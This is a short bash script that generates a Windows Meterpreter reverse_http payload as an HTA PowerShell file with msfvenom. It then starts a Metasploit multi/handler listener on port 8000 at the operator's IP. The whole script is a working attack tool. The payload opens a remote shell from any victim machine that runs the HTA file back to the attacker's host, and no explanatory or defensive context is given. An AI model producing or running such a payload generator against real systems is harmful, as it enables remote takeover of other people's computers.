#!/bin/bash
echo "[+] what is your IP"
ifconfig eth0
read ipaddr

msfvenom -p windows/meterpreter/reverse_http LHOST=$ipaddr LPORT=8000 -f hta-psh | tee -a payload.hta
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_http;set LHOST $ipaddr; set LPORT 8000; run"
